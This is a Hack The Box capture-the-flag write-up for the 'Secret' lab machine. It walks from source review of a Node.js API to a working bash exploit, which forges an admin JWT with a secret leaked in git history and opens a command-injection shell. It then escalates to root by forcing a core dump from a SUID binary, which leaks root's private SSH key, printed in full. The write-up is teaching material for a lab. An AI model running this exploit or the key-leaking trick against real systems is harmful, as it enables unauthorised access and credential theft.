<p align="center"><img src="img/banner.png" alt="Banner"></img></p>
<p align="center">Machine creator: <a href="https://app.hackthebox.com/profile/485024">z9fr</a></p>

[![f4T1H21](https://www.hackthebox.eu/badge/image/184235)](https://app.hackthebox.eu/profile/184235)
<br>
<a href="https://www.buymeacoffee.com/f4T1H21">
  <img src="https://github.com/f4T1H21/f4T1H21/blob/main/support.png" width="221" height="40" alt="Support">
  </img>
</a>
<br>

---
# Reconnaissance
### Nmap result

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## `80/tcp` HTTP service
![website](img/website.png)

A documentation for a Web API welcomes us, I couldn't find any endpoint other than `/docs` and `/api`.

In `/docs` there's a documentation for a basic web API.<br>
The site also mentions source code for the API in `/download/files.zip`

At first, I wondered if there's an LFI through `/download` because it's not 'downloads', you see? But that did not work.

### Documentation analysis
Below is quoted from the documentation.

>This is a API based Authentication system. we are using JWT tokens to make things more secure. to store the user data we are using mongodb, you can find a demo of how the api works in here this is a very secured Authentication system will well done documentation ( sometimes companies hide endpoints ) but our code is public

#### Registration
![docRegister](img/docRegister.png)

#### Login
![docLogin](img/docLogin.png)

#### Private Route
![docPriv](img/docPriv.png)

Basically; you register a user, then login with that, after that you get your user's verified JWT token.<br>
With the JWT token you get, you can check if your user is an admin or a regular user.

Now time to dive into the source code.

# JavaScript source code analysis
## index.js
```js
app.listen(3000, () => console.log("server up and running"));
```
- API runs on port `3000/tcp`

I think our developer uses MacOS 🙂, `local-web/public/assets/.DS_Store`

Here's the reason why I don't like npm:
```console
┌──(root💀f4T1H)-[~/hackthebox/secret/local-web]
└─# ls node_modules | wc -l
198
```

<img src="img/npm_meme.png" alt="npm_meme" width="500">

## routes/verifytoken.js
```js
const verified = jwt.verify(token, process.env.TOKEN_SECRET);
```
- As you can see there's no algorithm specified above, a more [secure code](https://www.npmjs.com/package/jsonwebtoken) could be:

```js
jwt.verify(token, secret, { algorithms: ['RS256'] }, function (err, payload) {
  // if token alg != RS256,  err == invalid signature
});
```

As ethical hackers, we're curious about a secret used to sign the token, right?<br>
And in the code it says the secret is `process.env.TOKEN_SECRET`.<br>
According to [this](https://www.javatpoint.com/nodejs-process) site:

>Node.js provides the facility to get process information such as process id, architecture, platform, version, release, uptime, upu usage etc. It can also be used to kill process, set uid, set groups, unmask etc.<br>
>The process is a global object, an instance of EventEmitter, can be accessed from anywhere.

>env	returns user environment

When we look at the main folder, we see a hidden `.env` file.

## .env
```
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```
We'll see if that '`secret`' makes sense...

## routes/private.js
```js
router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```
In the above code, there's a new endpoint routed which isn't mentioned in the documentation.

Routing of the endpoint `logs`
After checking the name in __verified__ JWT token is equals `theadmin`;<br>
- Executes a command string which is formatted with the value of `file` parameter in GET request.
- Responds with `stdout` returned from shell and error if the command fails (but not `stderr` I think).<br>

## .git
Moving forward, we have another hidden file named `.git`, which declares this is a git repository. Let's look at the commitments to see if there's any insteresting change.

```console
┌──(root💀f4T1H)-[~/hackthebox/secret/local-web]
└─# git log --pretty=oneline --abbrev-commit --shortstat
e297a27 (HEAD -> master) now we can view logs from server 😃
 1 file changed, 30 insertions(+), 5 deletions(-)
67d8da7 removed .env for security reasons
 1 file changed, 1 insertion(+), 1 deletion(-)
de0a46b added /downloads
 1 file changed, 1 insertion(+), 3 deletions(-)
4e55472 removed swap
 1 file changed, 0 insertions(+), 0 deletions(-)
3a367e7 added downloads
 1 file changed, 1 insertion(+), 1 deletion(-)
55fe756 first commit
 4012 files changed, 611005 insertions(+)
```
<br>

We see a commit in the second line descripted as:
`removed .env for security reasons`<br>
To see the difference made in a particular commit, we can either use `git log` with `-p` flag or the following syntax:

```console
┌──(root💀f4T1H)-[~/hackthebox/secret/local-web]
└─# git diff 67d8da7^ 67d8da7
diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
+TOKEN_SECRET = secret
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
```

With that all set, our attack vector is now clear.

# Foothold: OS Command Injection
## Attack Methodology

- Register a normal user.
- Login and get the user's JWT token.
- Change the JWT token's `name` key as `theadmin`
- Verify changed JWT token with the secret key.
- `GET` `/logs?file=$(COMMAND_TO_EXECUTE)`

## Writing a custom exploit

I'm lazy enough to do that step by step in here, so I've written a bash script.

![](img/24hlater.png)

I finally finished writing this pure exploit, It would have been a lot shorter if I had just showed the steps in here.<br>
But if you had asked me if it worthed, I would have definitely say YES!

The main references I used while writing this (öhm..öhm..., masterpiece):<br>

- [Bash CheetSheet](https://devhints.io/bash)

- [JWT Signing part](https://stackoverflow.com/a/46672439)


### [RCE Script](htb-secret-foothold-exploit.sh)

```bash
#!/usr/bin/env bash
# Author: Şefik Efe aka f4T1H
# https://github.com/f4T1H21/HackTheBox-Writeups/tree/main/Boxes/Secret/README.md#rce-script

echo -e "[i] Written with <3 by Şefik Efe aka f4T1H
[i] Hack The Box Secret Machine Foothold Exploit
"

url='http://10.10.11.120:3000/api'
ctype='Content-Type: application/json'
time=$(date +%s%N | cut -b1-13)
name=$time
email="root@${time}.com"
passwd='123456'

# Register
echo "[+] Registering low-level user ..."
curl -s -X POST -H "$ctype" -d '{"name":"'$name'", "email":"'$email'", "password":"'$passwd'"}' $url"/user/register" 1>/dev/null

# Login
echo "[+] Getting JWT ..."
jwt=$(curl -s -X POST -H "$ctype" -d '{"email":"'$email'", "password":"'$passwd'"}' $url"/user/login")

# Change name to 'theadmin'
echo "[+] Editing the JWT to become privileged ..."
jwt=$(jq -R '[split(".") | .[0],.[1] | @base64d | fromjson] | .[1].name="theadmin"' <<< $jwt)

# Sign changed token using HS256 algorithm
echo "[+] HS256 signing edited JWT with secret ..."
header=$(jq -c .[0] <<< $jwt)
payload=$(jq -c .[1] <<< $jwt)
alg='HS256'
secret='gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE'

b64enc() { openssl enc -base64 -A | tr '+/' '-_' | tr -d '='; }
json() { jq -c . | LC_CTYPE=C tr -d '\n'; }
hs_sign() { openssl dgst -binary -sha"$1" -hmac "$2"; }

signed_content="$(json <<< $header | b64enc).$(json <<< $payload | b64enc)"
sign=$(printf %s "$signed_content" | hs_sign "${alg#HS}" "$secret" | b64enc)
jwt=$(printf '%s.%s\n' "${signed_content}" "${sign}")

echo -e "[+] Here comes your shell prompt!\n"; sleep 1
while true; do
    # Get command
    read -e -p "[dasith@secret /home/dasith/local-web]$ " cmd

    # URL encode command
    cmd=$(echo -n $cmd | jq -sRr @uri | sed -e "s/'/%27/g")

    # Execute command
    out=$(curl \
             -s \
             -H "auth-token: $jwt" \
             $url"/logs?file=DoesNotExists;%20"$cmd \
             | sed -e 's/^"//g' -e 's/"$//g')

    if ! [[ $out == *'{"killed":false,"code":'*',"signal":null,"cmd":"git log --oneline DoesNotExists;'* ]]; then
        # Print output
        echo -e $out
    fi
done
```

Now, it's time to:

<img src="img/haşırt.png" alt="haşırt dı bılekbort keş on dı teybıl" width="500">

<br>

![user](img/user.png)

# Privilege Escalation: Leaking Memory using CoreDumps generated by C code

Checking SUID permissioned files gives us an executable: `/opt/count`

```console
dasith@secret:~$ find / -perm -u=s -type f 2>/dev/null | grep -vE '(/snap/|/usr/lib/)'
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/opt/count
```

We have four files, and the only one that we can read properly is [`code.c`](src/code.c).

```console
dasith@secret:/opt$ la
code.c  .code.c.swp  count  valgrind.log
```

Such a source code analysis box...

## C source [code](src/code.c) analysis

### `main`
- Takes a user input __a string up to 99 characters__ as a path.
- Decides if it is a directory or a file.
- Calls appropriate function. (`dircount`|`filecount`)
- Drops __root privileges__ (becomes normal user).
- Enables __coredump generation__.
- Takes a __one character__ user input to save results or not.
- (if `y` or `Y`)
- Takes a user input __a string up to 99 characters__ as a file path.
- Writes function returned values to the specified file.

We can't get a buffer overflow from there I guess as character number and formatting specified.<br>
The thing is, we should do what we want to before it drops root privileges. I mean in the first input.

Let's now take a look at the other functions.

### `dircount`
This function returns something like `ls` command's stdout but with file permissions. So I think it doesn't make sense for us to go from file permissions as we can do this through `file` command. I'm moving to the next function.

### `filecount`
This one's more simple and a very promising.

- __READ__ specified file and __STORE__ it in a variable.
- Check if the file was read properly.
- Count every character's category (`lines`|`words`).
- Return counted values.

### Conclusion
So,
- We know one can open any file and store the file contents in the memory.
- If the program generates a coredump, we will probably be able to read the memory and the file content.
- So we should look for triggering that coredump generation.

But first, let's take one step back and see what a `coredump` actually is.

>Core dump files provide a snapshot of a systems memory and process information, and are therefore useful when generated before a process crashes or otherwise exits abnormally. They are a useful aid in identifying bugs or other problems that led to a process crash.<br>
>Source: IBM

The other clue was the file `valgrind.log` in the same directory. As Wikipedia says: 'Valgrind is a programming tool for __memory debugging__, __memory leak detection__, and profiling.'

## Further enumeration on coredumps
I found an awesome article on coredumps in Linux.<br>
https://jvns.ca/blog/2018/04/28/debugging-a-segfault-on-linux/

>`kernel.core_pattern` is a kernel parameter or a “sysctl setting” that controls where the Linux kernel writes core dumps to disk.<br><br>
>Kernel parameters are a way to set global settings on your system. You can get a list of every kernel parameter by running `sysctl -a`, or use `sysctl kernel.core_pattern` to look at the `kernel.core_pattern` setting specifically.

```console
dasith@secret:/opt$ sysctl kernel.core_pattern 
kernel.core_pattern = |/usr/share/apport/apport %p %s %c %d %P %E
```

>- Ubuntu uses a system called “`apport`” to report crashes in apt packages.
>- Setting `kernel.core_pattern=|/usr/share/apport/apport %p %s %c %d %P` means that __core dumps will be piped to apport.__
>- apport has logs in `/var/log/apport.log`.

Things gets boring as I'm writing the 355th line on an easy box. Obviously it is more than an ordinary easy box.<br>

The new keyword is `apport`<br>
And, here I found another SO answer.<br>
https://stackoverflow.com/a/2067406

>In any case, the quick answer is that you should be able to find your core file in `/var/cache/abrt`, where `abrt` stores it after being invoked. Similarly, other systems using `Apport` may squirrel away cores in `/var/crash`, and so on.

```console
dasith@secret:/opt$ ls /var/cache/abrt -al
ls: cannot access '/var/cache/abrt': No such file or directory
dasith@secret:/opt$ ls /var/crash -al
total 8
drwxrwxrwt  2 root root 4096 Jan 27 11:33 .
drwxr-xr-x 14 root root 4096 Aug 13 05:12 ..
```

It seems like we find where our coredump files will be at.<br>
Let's generate a coredump now.

## Triggering a coredump

According to [this](https://stackoverflow.com/a/18773735) answer in SO, we can trigger a coredump generation by sending particular kill signals to the process.

```console
dasith@secret:/opt$ kill -l
 1) SIGHUP	 2) SIGINT	 3) SIGQUIT	 4) SIGILL	 5) SIGTRAP
 6) SIGABRT	 7) SIGBUS	 8) SIGFPE	 9) SIGKILL	10) SIGUSR1
11) SIGSEGV	12) SIGUSR2	13) SIGPIPE	14) SIGALRM	15) SIGTERM
16) SIGSTKFLT	17) SIGCHLD	18) SIGCONT	19) SIGSTOP	20) SIGTSTP
21) SIGTTIN	22) SIGTTOU	23) SIGURG	24) SIGXCPU	25) SIGXFSZ
26) SIGVTALRM	27) SIGPROF	28) SIGWINCH	29) SIGIO	30) SIGPWR
31) SIGSYS	34) SIGRTMIN	35) SIGRTMIN+1	36) SIGRTMIN+2	37) SIGRTMIN+3
38) SIGRTMIN+4	39) SIGRTMIN+5	40) SIGRTMIN+6	41) SIGRTMIN+7	42) SIGRTMIN+8
43) SIGRTMIN+9	44) SIGRTMIN+10	45) SIGRTMIN+11	46) SIGRTMIN+12	47) SIGRTMIN+13
48) SIGRTMIN+14	49) SIGRTMIN+15	50) SIGRTMAX-14	51) SIGRTMAX-13	52) SIGRTMAX-12
53) SIGRTMAX-11	54) SIGRTMAX-10	55) SIGRTMAX-9	56) SIGRTMAX-8	57) SIGRTMAX-7
58) SIGRTMAX-6	59) SIGRTMAX-5	60) SIGRTMAX-4	61) SIGRTMAX-3	62) SIGRTMAX-2
63) SIGRTMAX-1	64) SIGRTMAX
```

Let's try `SIGABRT`.

We know root has a private rsa key, let's grab it.

```console
dasith@secret:/opt$ ./count 
Enter source file/directory name: /root/.ssh/id_rsa

Total characters = 2602
Total words      = 45
Total lines      = 39
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count
dasith@secret:/opt$ jobs -l
[1]+  4342 Stopped                 ./count
dasith@secret:/opt$ kill -SIGABRT 4342
dasith@secret:/opt$ fg
./count
Aborted (core dumped)
dasith@secret:/opt$ ls /var/crash/
_opt_count.1000.crash
```

[This](https://askubuntu.com/a/947532) answer mentions an executable named `apport-unpack` that extracts our `CoreDump` from `apport`'s crash report in `/var/crash`.

```console
dasith@secret:/opt$ mkdir /tmp/.temp
dasith@secret:/opt$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/.temp/
dasith@secret:/opt$ strings /tmp/.temp/CoreDump | sed -n '/-----BEGIN OPENSSH PRIVATE KEY-----/,/-----END OPENSSH PRIVATE KEY-----/p'
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```console
root@secret:~# cut -c1-21 root.txt
e9ad235f4d1ff9be19329
```

Yes, we finally managed to pwn this easy (!) box.

Thanks for reading.

---

# References

|__`JavaScript jwt library documentation`__|__https://www.npmjs.com/package/jsonwebtoken__|
|:-|:-|
|__`NodeJS Global Object: 'process'`__|__https://www.javatpoint.com/nodejs-process__|
|__`BASH CheetSheet`__|__https://devhints.io/bash__|
|__`RSA & HMAC sign JWTs with BASH`__|__https://stackoverflow.com/a/46672439__|
|__`More on Core Dumps and Segfaults`__|__https://jvns.ca/blog/2018/04/28/debugging-a-segfault-on-linux/__|
|__`Where do Automated Bug Reporting Tools (ABRT) store coredumps`__|__https://stackoverflow.com/a/2067406__|
|__`Generating a core file with 'kill' signals`__|__https://stackoverflow.com/a/18773735__|
|__`Using 'apport-unpack' to unpack 'apport's bug report (get coredump)`__|__https://askubuntu.com/a/947532__|

<br>

___─ Written by f4T1H ─___
